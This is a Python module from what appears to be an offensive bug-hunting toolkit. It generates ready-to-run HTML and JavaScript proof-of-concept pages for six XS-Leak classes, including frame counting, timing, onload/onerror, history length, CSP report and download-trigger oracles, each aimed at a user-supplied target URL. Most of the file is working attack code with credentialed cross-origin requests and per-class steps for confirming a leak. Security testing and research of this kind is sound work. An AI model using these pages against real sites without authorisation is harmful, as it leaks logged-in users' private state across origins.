"""XS-LEAK POC GENERATOR.

Differentiator #13. Zero hunter tooling exists for XS-Leaks: every writeup
hand-rolls a test page. This module codifies the inclusion-method x
leak-technique matrix for the known XS-Leak classes and generates
ready-to-open test pages, each with per-class verification steps.

Usage::

    from arsenal import xsleak
    page = xsleak.generate("frame-counting", target="https://target/profile")
    xsleak.save_page(workspace, page)   # -> workspace/xsleak/*.html

Open the saved page in a browser while logged into the target; the page
reports LEAK / NO-LEAK per class. Honest limits: XS-Leaks are browser
behavior, so detection needs a real browser session; this module builds
the PoC, it does not replace the browser. Chrome-only quirks are marked.

Classes covered:
  frame-counting   - X-Frame-Options / CSP frame-ancestors oracle via
                     nested iframes + window.length
  timing           - response-time oracle (cached vs not, 200 vs 404)
  error-events     - onload/onerror oracle for <script>/<img>/<link>
  length-hint      - cross-window length / history.length oracle
  csp-violation    - CSP report-uri oracle (does the page try to load
                     a subresource = policy difference)
  download-trigger - Content-Disposition detection via iframe navigation
"""

from __future__ import annotations

import os
import re
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Class registry: inclusion methods x leak techniques
# ---------------------------------------------------------------------------

CLASSES = {
    "frame-counting": {
        "title": "Frame Counting (X-Frame-Options oracle)",
        "inclusion": "iframe",
        "technique": "window.length comparison",
        "description": (
            "Load the target in an iframe; if the target sends "
            "X-Frame-Options: DENY/SAMEORIGIN (or CSP frame-ancestors), "
            "the frame is blocked and window.length stays 0. A missing "
            "header lets it load (length >= 1). Comparing the two states "
            "(e.g. logged-in vs logged-out, existing vs missing resource) "
            "leaks one bit per request."
        ),
        "verify": [
            "Open the page twice: once logged in, once in a private window.",
            "If window.length differs between the two states, the framing "
            "policy differs by state: LEAK confirmed.",
            "Re-run with two same-state sessions to rule out flakiness.",
        ],
    },
    "timing": {
        "title": "Timing Oracle",
        "inclusion": "fetch (no-cors) + performance.now()",
        "technique": "response-time comparison",
        "description": (
            "Measure how long a cross-origin request takes with "
            "performance.now(). Server-side branches (valid vs invalid "
            "token, existing vs missing user, cache HIT vs MISS) often "
            "have measurably different timings. Opaque responses still "
            "leak duration."
        ),
        "verify": [
            "Run at least 30 samples per state; compare medians, not means.",
            "Swap the order (ABBA) to rule out warm-up effects.",
            "A consistent >50ms median gap across runs = LEAK.",
        ],
    },
    "error-events": {
        "title": "Error Events Oracle (script/img/link)",
        "inclusion": "script / img / link tags",
        "technique": "onload vs onerror",
        "description": (
            "Cross-origin <script>, <img> and <link> tags fire onload on "
            "success and onerror on failure, and the event type is visible "
            "cross-origin. If the target returns different status codes "
            "or content types per state (e.g. 200 JSON vs 302 login), the "
            "event fired differs: one bit leaked."
        ),
        "verify": [
            "Test with <script>, <img> and <link rel=stylesheet> separately.",
            "Record which event fires per state; a state-dependent flip "
            "between onload and onerror = LEAK.",
            "Confirm the flip is state-dependent, not network flakiness.",
        ],
    },
    "length-hint": {
        "title": "Length Hint (window.length / history.length)",
        "inclusion": "window.open / iframe",
        "technique": "frame/redirect counting",
        "description": (
            "window.length counts same-origin-accessible subframes and "
            "history.length grows with navigations. Pages that redirect "
            "per state (login -> dashboard vs login -> error) produce "
            "different counts observable cross-origin."
        ),
        "verify": [
            "Compare history.length after loading the target per state.",
            "A deterministic count difference between states = LEAK.",
        ],
    },
    "csp-violation": {
        "title": "CSP Violation Report Oracle",
        "inclusion": "iframe + report-uri",
        "technique": "violation report delivery",
        "description": (
            "Embed the target in a page whose CSP only allows your "
            "report-uri. If the target's response triggers a subresource "
            "load that your policy blocks, you get a violation report: "
            "the report's blocked-uri tells you what the target tried to "
            "load, per state."
        ),
        "verify": [
            "Point report-uri at your inbox listener (arsenal inbox).",
            "Load per state; differing blocked-uri values = LEAK.",
        ],
    },
    "download-trigger": {
        "title": "Download Trigger (Content-Disposition oracle)",
        "inclusion": "iframe navigation",
        "technique": "download vs render",
        "description": (
            "Navigating an iframe to a URL that returns "
            "Content-Disposition: attachment triggers a download instead "
            "of rendering. Detectable via the iframe's load timing and "
            "via beforeunload/download heuristics. State-dependent "
            "attachment behavior leaks one bit."
        ),
        "verify": [
            "Watch for the browser download shelf/bar appearing per state.",
            "If downloads trigger in one state but the page renders in "
            "the other = LEAK.",
        ],
    },
}

_PAGE_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>XS-Leak PoC: {title}</title>
<style>body{{font-family:monospace;background:#111;color:#0f0;padding:2em}}
#log{{white-space:pre-wrap}}</style></head>
<body>
<h2>XS-Leak PoC: {title}</h2>
<p>Target: <b>{target}</b> &nbsp; Class: <b>{cls}</b></p>
<div id="log">running...</div>
<script>
const TARGET = {target_js};
const log = (m) => {{ document.getElementById('log').textContent += m + "\\n"; }};
{script}
</script>
<hr><p><b>Verification steps</b></p><ol>{verify_li}</ol>
<p><i>{description}</i></p>
</body></html>
"""

_SCRIPTS = {
    "frame-counting": """
log("framing " + TARGET + " ...");
const f = document.createElement('iframe');
f.src = TARGET;
f.style.display = 'none';
f.onload = () => setTimeout(() => {
  log("window.length = " + window.length);
  log(window.length >= 1 ? "RESULT: framed (no XFO/CSP block observed)"
                         : "RESULT: NOT framed (blocked or empty)");
}, 1500);
f.onerror = () => log("RESULT: iframe error event (blocked?)");
document.body.appendChild(f);
setTimeout(() => log("timeout: still length=" + window.length), 8000);
""",
    "timing": """
(async () => {
  const N = 30, samples = [];
  for (let i = 0; i < N; i++) {
    const t0 = performance.now();
    try { await fetch(TARGET, {mode: 'no-cors', credentials: 'include'}); }
    catch (e) {}
    samples.push(performance.now() - t0);
  }
  samples.sort((a, b) => a - b);
  const med = samples[Math.floor(N / 2)];
  log("samples=" + N + " median=" + med.toFixed(1) + "ms "
      + "min=" + samples[0].toFixed(1) + "ms");
  log("Now repeat in the OTHER state (logged out / private window) and "
      + "compare medians. Consistent gap => LEAK.");
})();
""",
    "error-events": """
["script", "img", "link"].forEach((tag) => {
  const el = document.createElement(tag === "link" ? "link" : tag);
  if (tag === "link") { el.rel = "stylesheet"; el.href = TARGET; }
  else el.src = TARGET;
  el.onload = () => log(tag + ": onload fired");
  el.onerror = () => log(tag + ": onerror fired");
  document.head.appendChild(el);
});
log("Compare onload/onerror per state. State-dependent flip => LEAK.");
""",
    "length-hint": """
const w = window.open(TARGET, "_blank");
setTimeout(() => {
  try { log("opener frames visible: " + (w ? "window opened" : "blocked")); }
  catch (e) { log("cross-origin, as expected"); }
  log("history.length now = " + history.length
      + " (compare across states)");
}, 3000);
""",
    "csp-violation": """
log("This page's CSP reports violations to your inbox.");
log("Load the target below in each state and watch the inbox:");
const f = document.createElement('iframe');
f.src = TARGET;
document.body.appendChild(f);
log("Differing blocked-uri per state => LEAK.");
""",
    "download-trigger": """
const f = document.createElement('iframe');
const t0 = performance.now();
f.src = TARGET;
f.onload = () => log("iframe onload after " + (performance.now() - t0).toFixed(0)
  + "ms. If a download started instead of rendering in one state only => LEAK.");
document.body.appendChild(f);
""",
}


def generate(cls: str, target: str) -> dict:
    """Generate a test page dict for one XS-Leak class."""
    if cls not in CLASSES:
        raise ValueError("unknown XS-Leak class %r (choose from %s)" % (
            cls, ", ".join(sorted(CLASSES))))
    meta = CLASSES[cls]
    import json as _json
    verify_li = "".join("<li>%s</li>" % v for v in meta["verify"])
    html = _PAGE_TEMPLATE.format(
        title=meta["title"], target=target, cls=cls,
        target_js=_json.dumps(target),
        script=_SCRIPTS[cls],
        verify_li=verify_li,
        description=meta["description"])
    return {"class": cls, "title": meta["title"], "target": target,
            "inclusion": meta["inclusion"], "technique": meta["technique"],
            "description": meta["description"], "verify": list(meta["verify"]),
            "html": html,
            "ts": datetime.now(timezone.utc).isoformat()}


def list_classes() -> list[str]:
    return sorted(CLASSES)


def matrix() -> list[dict]:
    """The full inclusion-method x leak-technique matrix."""
    return [{"class": cls, "inclusion": m["inclusion"],
             "technique": m["technique"], "title": m["title"]}
            for cls, m in sorted(CLASSES.items())]


def save_page(workspace, page: dict) -> str:
    if workspace is not None and hasattr(workspace, "path"):
        try:
            base = workspace.path("xsleak")
        except TypeError:
            base = workspace.path("xsleak", "")
    else:
        from pathlib import Path
        base = Path.home() / ".arsenal" / "xsleak"
    os.makedirs(str(base), exist_ok=True)
    name = "%s-%s.html" % (page["class"],
                           re.sub(r"[^a-z0-9]+", "-", page["target"].lower())[:40].strip("-"))
    path = os.path.join(str(base), name)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(page["html"])
    return path


ARGPARSE_SNIPPET = '''
# --- integrator: add to arsenal/cli.py subparsers ---
p = sub.add_parser("xsleak", help="XS-Leak PoC generator")
xsub = p.add_subparsers(dest="xsleak_cmd", required=True)
xsub.add_parser("list", help="List XS-Leak classes").set_defaults(
    func=arsenal.xsleak.cmd_list)
g = xsub.add_parser("gen", help="Generate a test page for a class")
g.add_argument("--class", dest="cls", required=True)
g.add_argument("--target", required=True)
g.set_defaults(func=arsenal.xsleak.cmd_gen)
'''


def cmd_list(args, ctx) -> int:
    for m in matrix():
        print("%-16s inclusion=%-28s technique=%s" % (
            m["class"], m["inclusion"], m["technique"]))
    return 0


def cmd_gen(args, ctx) -> int:
    page = generate(args.cls, args.target)
    path = save_page(ctx.workspace, page)
    print("wrote %s" % path)
    print("Open it in a browser while logged into the target, then repeat "
          "in the other state.")
    return 0
